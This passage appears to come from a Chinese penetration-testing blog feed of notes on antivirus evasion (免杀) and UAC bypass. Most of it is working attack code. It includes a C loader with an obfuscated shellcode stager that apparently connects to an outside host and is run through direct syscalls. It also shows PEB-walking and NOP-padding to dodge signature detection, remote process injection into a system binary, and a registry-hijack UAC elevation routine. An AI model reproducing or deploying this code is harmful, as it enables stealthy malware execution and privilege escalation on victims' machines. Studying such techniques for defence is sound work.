(!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &amp;TokenPrivileges.Privileges[0].Luid)) {CloseHandle(hToken);return FALSE;}if (!AdjustTokenPrivileges(hToken, FALSE, &amp;TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {CloseHandle(hToken);return FALSE;}CloseHandle(hToken);return TRUE;}int wmain(int argc, wchar_t* argv[]) {// 仅支持64位系统if (sizeof(LPVOID) != 8) {exit(1);}//判断是否为管理员权限if (!IsElevated()) {exit(1);}SetDebugPrivilege();PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));// 获取版本信息OSVERSIONINFOEXW osInfo;LPWSTR lpOSVersion;osInfo.dwOSVersionInfoSize = sizeof(osInfo);_RtlGetVersion RtlGetVersion = (_RtlGetVersion)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");if (RtlGetVersion == NULL) {return FALSE;}wprintf(L"[1] Checking OS version details:\n");RtlGetVersion(&amp;osInfo);swprintf_s(pWinVerInfo-&gt;chOSMajorMinor, _countof(pWinVerInfo-&gt;chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);pWinVerInfo-&gt;dwBuildNumber = osInfo.dwBuildNumber;if (_wcsicmp(pWinVerInfo-&gt;chOSMajorMinor, L"10.0") == 0) {lpOSVersion = L"10 or Server 2016";wprintf(L"[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo-&gt;dwBuildNumber);wprintf(L"[+] Mapping version specific System calls.\n");NtAllocateVirtualMemory = &amp;NtAllocateVirtualMemory10;ZwProtectVirtualMemory = &amp;ZwProtectVirtualMemory10;NtCreateThread = &amp;NtCreateThread10;pWinVerInfo-&gt;SystemCall = 0x3F;}else if (_wcsicmp(pWinVerInfo-&gt;chOSMajorMinor, L"6.1") == 0 &amp;&amp; osInfo.dwBuildNumber == 7601) {lpOSVersion = L"7 SP1 or Server 2008 R2";wprintf(L"[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo-&gt;dwBuildNumber);wprintf(L"[+] Mapping version specific System calls.\n");NtAllocateVirtualMemory = &amp;NtAllocateVirtualMemory7SP1;ZwProtectVirtualMemory = &amp;ZwProtectVirtualMemory7SP1;NtCreateThread = &amp;NtCreateThread7SP1;pWinVerInfo-&gt;SystemCall = 0x3C;}else if (_wcsicmp(pWinVerInfo-&gt;chOSMajorMinor, L"6.2") == 0) {lpOSVersion = L"8 or Server 2012";wprintf(L"[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo-&gt;dwBuildNumber);exit(1);wprintf(L"[+] Mapping version specific System calls.\n");pWinVerInfo-&gt;SystemCall = 0x3D;}else if (_wcsicmp(pWinVerInfo-&gt;chOSMajorMinor, L"6.3") == 0) {lpOSVersion = L"8.1 or Server 2012 R2";wprintf(L"[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo-&gt;dwBuildNumber);wprintf(L"[+] Mapping version specific System calls.\n");NtAllocateVirtualMemory = &amp;NtAllocateVirtualMemory81;ZwProtectVirtualMemory = &amp;ZwProtectVirtualMemory81;NtCreateThread = &amp;NtCreateThread81;pWinVerInfo-&gt;SystemCall = 0x3E;}else {wprintf(L"[!] OS Version not supported.\n\n");exit(1);}/*Shellcode 每三个字节替换成\x00 进行加密*/unsigned char data[] = "\x00\xe8\x89\x00\x00\x00\x00\x89\xe5\x00\xd2\x64\x00\x52\x30\x00\x52\x0c\x00\x52\x14\x00\x72\x28\x00\xb7\x4a\x00\x31\xff\x00\xc0\xac\x00\x61\x7c\x00\x2c\x20\x00\xcf\x0d\x00\xc7\xe2\x00\x52\x57\x00\x52\x10\x00\x42\x3c\x00\xd0\x8b\x00\x78\x85\x00\x74\x4a\x00\xd0\x50\x00\x48\x18\x00\x58\x20\x00\xd3\xe3\x00\x49\x8b\x00\x8b\x01\x00\x31\xff\x00\xc0\xac\x00\xcf\x0d\x00\xc7\x38\x00\x75\xf4\x00\x7d\xf8\x00\x7d\x24\x00\xe2\x58\x00\x58\x24\x00\xd3\x66\x00\x0c\x4b\x00\x58\x1c\x00\xd3\x8b\x00\x8b\x01\x00\x89\x44\x00\x24\x5b\x00\x61\x59\x00\x51\xff\x00\x58\x5f\x00\x8b\x12\x00\x86\x5d\x00\x6e\x65\x00\x00\x68\x00\x69\x6e\x00\x54\x68\x00\x77\x26\x00\xff\xd5\x00\x00\x00\x00\x00\x31\x00\x57\x57\x00\x57\x57\x00\x3a\x56\x00\xa7\xff\x00\xe9\xa4\x00\x00\x00\x00\x31\xc9\x00\x51\x6a\x00\x51\x51\x00\xbb\x01\x00\x00\x53\x00\x68\x57\x00\x9f\xc6\x00\xd5\x50\x00\x8c\x00\x00\x00\x5b\x00\xd2\x52\x00\x00\x32\x00\x84\x52\x00\x52\x53\x00\x50\x68\x00\x55\x2e\x00\xff\xd5\x00\xc6\x83\x00\x50\x68\x00\x33\x00\x00\x89\xe0\x00\x04\x50\x00\x1f\x56\x00\x75\x46\x00\x86\xff\x00\x5f\x31\x00\x57\x57\x00\xff\x53\x00\x68\x2d\x00\x18\x7b\x00\xd5\x85\x00\x0f\x84\x00\x01\x00\x00\x31\xff\x00\xf6\x74\x00\x89\xf9\x00\x09\x68\x00\xc5\xe2\x00\xff\xd5\x00\xc1\x68\x00\x21\x5e\x00\xff\xd5\x00\xff\x57\x00\x07\x51\x00\x50\x68\x00\x57\xe0\x00\xff\xd5\x00\x00\x2f\x00\x00\x39\x00\x75\x07\x00\x50\xe9\x00\xff\xff\x00\x31\xff\x00\x91\x01\x00\x00\xe9\x00\x01\x00\x00\xe8\x6f\x00\xff\xff\x00\x77\x42\x00\x6d\x00\x00\x42\xc6\x00\x6f\xba\x00\x3d\xd8\x00\xfc\x47\x00\xbc\xdc\x00\xe5\xb9\x00\x57\x1e\x00\xe6\xd9\x00\x4f\x31\x00\x37\x66\x00\x69\xf2\x00\xae\xf8\x00\x5d\xde\x00\x53\x49\x00\x59\x04\x00\x49\x62\x00\x1d\x70\x00\xd4\xcb\x00\x66\x6d\x00\x06\x5b\x00\xe8\xc7\x00\xf2\xcf\x00\xa7\x75\x00\x9a\xb0\x00\x00\x55\x00\x65\x72\x00\x41\x67\x00\x6e\x74\x00\x20\x4d\x00\x7a\x69\x00\x6c\x61\x00\x34\x2e\x00\x20\x28\x00\x6f\x6d\x00\x61\x74\x00\x62\x6c\x00\x3b\x20\x00\x53\x49\x00\x20\x37\x00\x30\x3b\x00\x57\x69\x00\x64\x6f\x00\x73\x20\x00\x54\x20\x00\x2e\x31\x00\x20\x54\x00\x69\x64\x00\x6e\x74\x00\x34\x2e\x00\x29\x0d\x00\x00\x65\x00\x75\x9d\x00\x44\xb7\x00\xc6\x44\x00\xdc\xc8\x00\x94\xf1\x00\x08\x48\x00\xac\xac\x00\xf0\xfa\x00\xf4\x24\x00\x95\xec\x00\xbe\x97\x00\x01\x5e\x00\x85\x66\x00\xd3\x11\x00\xd8\xb5\x00\x4b\x87\x00\x84\x9f\x00\x50\x09\x00\x54\x1b\x00\xc0\x50\x00\x75\xd9\x00\xa2\x05\x00\x23\x9d\x00\x5b\x20\x00\xf3\x86\x00\x3b\x9f\x00\x07\x77\x00\xa0\x8a\x00\x5a\x87\x00\x64\xd1\x00\xcf\xe2\x00\xa1\x26\x00\xdb\x63\x00\xca\x11\x00\x48\x45\x00\x5c\x05\x00\x42\x1e\x00\x9a\x23\x00\xb0\xe7\x00\xfa\x35\x00\xf4\xe3\x00\x31\xe0\x00\xcd\x8f\x00\xf8\x14\x00\x0f\x89\x00\x03\xa2\x00\xce\x2b\x00\x5f\x57\x00\x32\xac\x00\x3e\xad\x00\xa8\xc8\x00\x66\x01\x00\x6c\xa9\x00\x36\xed\x00\xa2\x57\x00\x95\x06\x00\x9b\x07\x00\xc4\x02\x00\x44\xf0\x00\x9e\x36\x00\x6f\xdf\x00\x33\xce\x00\xa9\xce\x00\xce\x0a\x00\xf4\xb9\x00\x5c\xae\x00\x23\xce\x00\xac\x8f\x00\x09\x85\x00\x37\xb9\x00\x25\x6b\x00\x38\xe3\x00\xda\xd9\x00\x96\x1c\x00\x0c\x00\x00\xf0\xb5\x00\x56\xff\x00\x6a\x40\x00\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x00\xa4\x53\x00\xff\xd5\x00\xb9\x00\x00\x00\x00\x00\xd9\x51\x00\x89\xe7\x00\x68\x00\x00\x00\x00\x00\x56\x68\x00\x96\x89\x00\xff\xd5\x00\xc0\x74\x00\x8b\x07\x00\xc3\x85\x00\x75\xe5\x00\xc3\xe8\x00\xfd\xff\x00\x31\x30\x00\x2e\x31\x00\x2e\x31\x00\x36\x2e\x00\x37\x00\x00\x00\x00\x00";char a1[] = "\xfc\x00\x60\x31\x8b\x8b\x8b\x8b\x0f\x26\x31\x3c\x02\xc1\x01\xf0\x8b\x8b\x01\x40\xc0\x01\x8b\x8b\x01\x3c\x34\xd6\x31\xc1\x01\xe0\x03\x3b\x75\x8b\x01\x8b\x8b\x01\x04\xd0\x24\x5b\x5a\xe0\x5a\xeb\x68\x74\x77\x69\x4c\x07\xe8\x00\xff\x57\x68\x79\xd5\x00\x5b\x51\x03\x68\x00\x50\x89\xff\xe9\x00\x31\x68\xc0\x52\x52\xeb\x3b\x89\xc3\x80\x00\x6a\x6a\x68\x9e\xd5\xff\x6a\x56\x06\xff\xc0\xca\x00\x85\x04\xeb\xaa\x5d\x89\x45\x31\x31\x6a\x56\xb7\x0b\xbf\x00\xc7\x58\x7b\xff\xe9\x00\xc9\x00\xff\x2f\x36\x8b\x20\xaf\xf5\xe9\xb6\xf5\x9b\x86\xbc\x09\x77\x40\x33\x2e\x1a\x31\x64\x02\xb6\x09\x07\xd3\x48\xa8\x73\x2d\x65\x3a\x6f\x6c\x2f\x30\x63\x70\x69\x65\x4d\x45\x2e\x20\x6e\x77\x4e\x35\x3b\x72\x65\x2f\x30\x0a\x1b\xb1\xb6\x11\xa7\x6e\x13\xc6\x3d\x5d\x24\x53\xc2\x36\x91\xfe\x53\x5a\x64\x3b\x31\x02\xf1\x0e\x22\x54\xa9\x33\x03\xa4\x27\x4e\xd9\x6b\xdc\x2f\x09\x3c\x3b\x8d\x26\x74\x43\x03\x83\x66\xc9\x1c\x0e\x9a\xef\x2b\x10\x15\xaf\x89\x8c\x1f\xcb\x51\x5c\xc1\x7a\xed\x94\x2b\x50\x72\x5c\x52\xc5\x97\x1b\xb3\x5c\x68\xa2\xd5\x68\x00\x00\x00\x58\xe5\x93\x00\x01\x53\x57\x20\x53\x12\xe2\x85\xc6\x01\xc0\x58\x89\xff\x33\x30\x39\x33\x00\x06";SIZE_T Size = sizeof(data);for (int i = 0; i &lt; sizeof(a1); i++) {memcpy(&amp;data[i * 3], &amp;a1[i], 1);}PVOID lpvAddr = NULL;NTSTATUS status;status = NtAllocateVirtualMemory(GetCurrentProcess(), &amp;lpvAddr, 0, &amp;Size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);RtlMoveMemory(lpvAddr, data, sizeof(data));HANDLE ThreadHandle = NULL;CONTEXT NewThreadContext = { 0 };INITIAL_TEB InitialTeb = { 0 };OBJECT_ATTRIBUTES ObjAttr2 = { 0 };CLIENT_ID ReturnTid = { 0 };if (MyInitTeb(&amp;InitialTeb) != 0) {return -1;}if (MyInitContext(&amp;NewThreadContext,(PVOID)lpvAddr,NULL,InitialTeb.StackBase) != 0){return -1;}InitializeObjectAttributes(&amp;ObjAttr2, NULL, 0, NULL, NULL);status = ZwProtectVirtualMemory(GetCurrentProcess(), &amp;lpvAddr, &amp;Size, PAGE_EXECUTE, &amp;OldProtection);status = NtCreateThread(&amp;ThreadHandle,THREAD_ALL_ACCESS,&amp;ObjAttr2,GetCurrentProcess(),&amp;ReturnTid,&amp;NewThreadContext,&amp;InitialTeb,FALSE);WaitForSingleObject(ThreadHandle, INFINITE);//ULONG OldProtection;//status = ZwProtectVirtualMemory(GetCurrentProcess(), &amp;lpvAddr, &amp;Size, PAGE_EXECUTE, &amp;OldProtection);//HANDLE s;//s = CreateThread(0, 0, lpvAddr, NULL, 0, 0);//WaitForSingleObject(s, INFINITE);return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="动态调用-API-函数"><a href="#动态调用-API-函数" class="headerlink" title="动态调用 API 函数"></a>动态调用 API 函数</h2><pre class="line-numbers language-none"><code class="language-none">void* ntAllocateVirtualMemory = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtAllocateVirtualMemory");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://4hou.win/wordpress/?cat=612">https://4hou.win/wordpress/?cat=612</a></p><p>通过动态调用 API 函数的方式来调用 virtualalloc 函数。具体的做法是， load kernel32.dll 库，使用汇编语言从 kernel32 库中取得 virtualalloc 函数在内存中的地址，然后执行。 另外,假设Loadlibrary函数也被hook了(这也太硬核了),我们也可以从PEB中获取函数地址,下面代码demo为Load kernel32.dll, 再有甚者,对机器码做了模式匹配,我们可以在代码中加入一些nop指令或者一些正常功能的垃圾混淆代码。</p><pre class="line-numbers language-none"><code class="language-none">//HMODULE hModule =LoadLibrary(_T("Kernel32.dll"));HMODULE hModule = NULL;//LoadLibrary 记得从中加入一些nop指令(空指令雪橇)//空指令雪橇原理: 针对机器码匹配的话基本是进行模式匹配的__asm {mov esi, fs: [0x30]//得到PEB地址     nop     nopmov esi, [esi + 0xc]//指向PEB_LDR_DATA结构的首地址mov esi, [esi + 0x1c]//一个双向链表的地址mov esi, [esi]//得到第二个条目kernelBase的链表mov esi, [esi]//得到第三个条目kernel32链表（win10）mov esi, [esi + 0x8] //kernel32.dll地址mov hModule, esi}HANDLE shellcode_handler;FARPROC Address = GetProcAddress(hModule,"VirtualAlloc");//拿到virtualalloc的地址_asm{      push 40h  //push传参      push 1000h      push 29Ah      push 0      call Address  //函数调用      mov shellcode_handler, eax}memcpy(shellcode_handler, newshellcode,sizeof newshellcode);((void(*)())shellcode_handler)();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="垃圾混淆代码—nop-nop空指令雪橇"><a href="#垃圾混淆代码—nop-nop空指令雪橇" class="headerlink" title="垃圾混淆代码—nop nop空指令雪橇"></a>垃圾混淆代码—nop nop空指令雪橇</h2><pre class="line-numbers language-none"><code class="language-none">_asm {mov esi, fs:[0x30]//得到PEB地址NOPNOPNOPNOPNOPmov esi, [esi + 0xc]//指向PEB_LDR_DATA结构的首地址NOPNOPNOPNOPmov esi, [esi + 0x1c]//一个双向链表的地址NOPNOPNOPNOPmov esi, [esi]//得到第二个条目kernelBase的链表NOPNOPNOPmov esi, [esi]//得到第三个条目kernel32链表（win10）NOPNOPmov esi, [esi + 0x8] //kernel32.dll地址NOPNOPmov hModule, esi}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.32-luan-quan-ye-da-bu-si-lao-shi-fu-er/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.32-luan-quan-ye-da-bu-si-lao-shi-fu-er/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/monoxgas/sRDI">https://github.com/monoxgas/sRDI</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656554515045/2147c2d7fb9e45d394f18a02f005f273.png" alt="image.png"></p><p>系统直接调用<br>Windows操作系统中实际只使用了两个特权级别：</p><p>一个是Ring3层，平时我们所见到的应用程序运行在这一层，所以叫它用户层，也叫User-Mode。所以下次听到别人讲（Ring3、用户层、User-Mode）时，其实是在讲同一个概念。</p><p>一个是Ring0层，像操作系统内核（Kernel）这样重要的系统组件，以及设备驱动都是运行在Ring0，内核层，也叫</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656554515045/42cb01fa343049ca834d6e30b3bb4804.png" alt="image.png"></p><p>通过这些保护层来隔离普通的用户程序，不能直接访问内存区域，以及运行在内核模式下的系统资源。</p><p>当一个用户层程序需要执行一个特权系统操作，或者访问内核资源时。处理器首先需要切换到Ring0模式下才能执行后面的操作。</p><p>切换Ring0的代码，也就是直接系统调用所在的地方。</p><p>我们通过监控Notepad.exe进程保存一个.txt文件，来演示一个应用层程序如何切换到内核模式执行的：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656554515045/e60bcf73933d4dc992bffbc4e22f3587.png" alt="image.png"></p><p>我们可以看到 notepad调用了kernel32模块中的WriteFile 函数，然后该函数内部又调用了ntdll中的NtWriteFile来到了Ring3与Ring0的临界点。</p><p>因为程序保存文件到磁盘上，所以操作系统需要访问相关的文件系统和设备驱动。应用层程序自己是不允许直接访问这些需要特权资源的。</p><p>应用程序直接访问设备驱动会引起一些意外的后果（当然操作系统不会出事，最多就是应用程序的执行流程出错导致崩溃）。所以，在进入内核层之前，调用的最后一个用户层API就是负责切换到内核模式的。</p><p>CPU中通过执行syscall指令，来进入内核模式，至少x64架构是这样的。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656554515045/42c15ea95d924163861cb9e602d18f2a.png" alt="image.png"></p><p>把被调用函数相关的参数PUSH到栈上以后，ntdll中的NtWriteFile函数的职责就是，设置EAX为对应的”系统调用号”，最后执行syscall指令，CPU就来到了内核模式（Ring0）下执行。</p><p>进入内核模式后，内核通过diapatch table（SSDT），来找到和系统调用号对应的Kernel API，然后将用户层栈上的参数，拷贝到内核层的栈中，最后调用内核版本的ZwWriteFile函数。</p><p>当内核函数执行完成时，使用几乎相同的方法回到用户层，并返回内核API函数的返回值（指向接收数据的指针或文件句柄）。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656554515045/02eb3d8ece8a44fa9dff4cab4048676a.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.32-luan-quan-ye-da-bu-si-lao-shi-fu-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.32-luan-quan-ye-da-bu-si-lao-shi-fu-yi/</url>
      
        <content type="html"><![CDATA[<p>目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。</p><p>对特征来讲，大多数杀毒软件会定义一个阈值，当文件内部的特征数量达到一定程度就会触发报警，也不排除杀软会针对某个EXP会限制特定的入口函数来查杀。当然还有通过md5，sha1等hash函数来识别恶意软件，这也是最简单粗暴，最容易绕过的。 针对特征的免杀较为好做，可以使用加壳改壳、添加/替换资源、修改已知特征码/会增加查杀概率的单词（比如某函数名为ExecutePayloadshellcode）、加密Shellcode等等。</p><p>CreateThread CreateThreadEx</p><p>xxx -&gt; ntdll.dll -&gt; win32API</p><p>对行为来讲，很多个API可能会触发杀软的监控，比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。 针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。除常规的替换、使用未导出的API等姿势外，我们还可以使用通过直接系统调用的方式实现，比如使用内核层面Zw系列的API，绕过杀软对应用层的监控（如下图所示，使用ZwAllocateVirtualMemory函数替代VirtualAlloc）。</p><pre class="line-numbers language-none"><code class="language-none">int main(){LPVOID lpvAddr = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);unsigned char data[] = "\x00\x48\x83";char a1[] = "\xfc\xe4\xc8";SIZE_T Size = sizeof(data);//decryptfor (int i = 0; i &lt; sizeof(a1); i++) {memcpy(&amp;data[i * 3], &amp;a1[i], 1);}RtlMoveMemory(lpvAddr, data, sizeof(data));DWORD pa = 0x01;VirtualProtect(lpvAddr, sizeof(data), 0x10, &amp;pa);if (lpvAddr != NULL) {HANDLE s;s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, data, 0, 0);WaitForSingleObject(s, INFINITE);}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ThreadHijacking<br>VirtualAllocEx(CreateNewProcess)</p><pre class="line-numbers language-none"><code class="language-none">char a1[] = "\xfc\xe4\xc8\x00\x41\x51...";SIZE_T size = 0;STARTUPINFOEXA si;PROCESS_INFORMATION pi;ZeroMemory(&amp;si, sizeof(si));si.StartupInfo.cb = sizeof(STARTUPINFOEXA);si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;ZeroMemory(&amp;si, sizeof(si));si.StartupInfo.cb = sizeof(STARTUPINFOEXA);si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &amp;size);BOOL success = CreateProcessA(NULL,(LPSTR)"C:\\Windows\\System32\\mblctr.exe",NULL,NULL,true,CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,//有扩展启动信息的结构体NULL,NULL,reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;si),&amp;pi);HANDLE notepadHandle = pi.hProcess;LPVOID remoteBuffer = VirtualAllocEx(notepadHandle, NULL, sizeof data, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);WriteProcessMemory(notepadHandle, remoteBuffer, data, sizeof data, NULL);HANDLE remoteThread = CreateRemoteThread(notepadHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);if (WaitForSingleObject(remoteThread, INFINITE) == WAIT_FAILED) {return 1;}if (ResumeThread(pi.hThread) == -1) {return 1;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>VirtualAllocEx(Use existing app)</p><pre class="line-numbers language-none"><code class="language-none">HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, false, procID);if (hProc == INVALID_HANDLE_VALUE) {    printf("Error opening process ID %d\n", procID);    return 1;}void *alloc = VirtualAllocEx(hProc, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);if (alloc == NULL) {    printf("Error allocating memory in remote process\n");    return 1;}if (WriteProcessMemory(hProc, alloc, shellcode, sizeof(shellcode), NULL) == 0) {    printf("Error writing to remote process memory\n");    return 1;}HANDLE tRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);if (tRemote == INVALID_HANDLE_VALUE) {    printf("Error starting remote thread\n");    return 1;}WaitForSingleObject(tRemote, INFINITE) == WAIT_FAILED<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>VirtualProtect</p><pre class="line-numbers language-none"><code class="language-none">// BOOL VirtualProtect(//   LPVOID lpAddress,//   SIZE_T dwSize,//   DWORD  flNewProtect,//   PDWORD lpflOldProtect// );LPVOID lpvAddr = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);DWORD pa = 0x01;VirtualProtect(lpvAddr, sizeof(data), PAGE_EXECUTE, &amp;pa);//PAGE_EXECUTE 启用对页面的提交区域的执行访问。尝试写入提交的区域会导致访问冲突<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.31-bypass-uac-ti-quan-yuan-li-er/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.31-bypass-uac-ti-quan-yuan-li-er/</url>
      
        <content type="html"><![CDATA[<p>在CompMgmtLauncher.exe启动的过程中，有一个关键的操作就是它会先读取注册表HKCU\Software\Classes\mscfile\shell\open\command的数据。打开系统注册表编辑器regedit.exe，查看相应路径下的注册表，发现该注册表路径确实不存在。所以，如果自己构造该注册路径，写入启动程序的路径，这样，CompMgmtLauncher.exe便会启动该程序。为了验证这个猜想，自己手动添加该注册表路径，并设置默认的数据为C:\Windows\System32\cmd.exe，然后使用Procmon.exe进行监控并运行CompMgmtLauncher.exe，成功弹出cmd.exe命令行窗口，而且提示管理员权</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656379868015/01a539cb84fe490ea6ee8d0bad6bc6fc.png" alt="image.png"></p><p>查看Procmon.exe的监控数据，CompMgmtLauncher.exe确实直接读取HKCU\Software\Classes\mscfile\shell\open\command(Default)注册表路径中的数据并启动，如图6-3所示</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656379868015/f2114dbd83fa4bb28bafb7a932cae796.png" alt="image.png"></p><p>// 修改注册表</p><pre class="line-numbers language-none"><code class="language-none">BOOL SetReg(char *lpszExePath){HKEY hKey = NULL;// 创建项::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\Shell\\Open\\Command", 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;hKey, NULL);if (NULL == hKey){ShowError("RegCreateKeyEx");return FALSE;}// 设置键值::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE *)lpszExePath, (1 + ::lstrlen(lpszExePath)));// 关闭注册表::RegCloseKey(hKey);return TRUE;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试<br>直接运行上述程序，向注册表HKCU\Software\Classes\mscfile\shell\open\command(Default)中写入cmd.exe的路径，启动cmd.exe进程。cmd.exe成功启动，窗口标题显示管理员字样，如图6-4所示。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656379868015/77bd823912fd4f2898a6e3222c4b83ee.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.31-bypass-uac-ti-quan-yuan-li-san/"/>
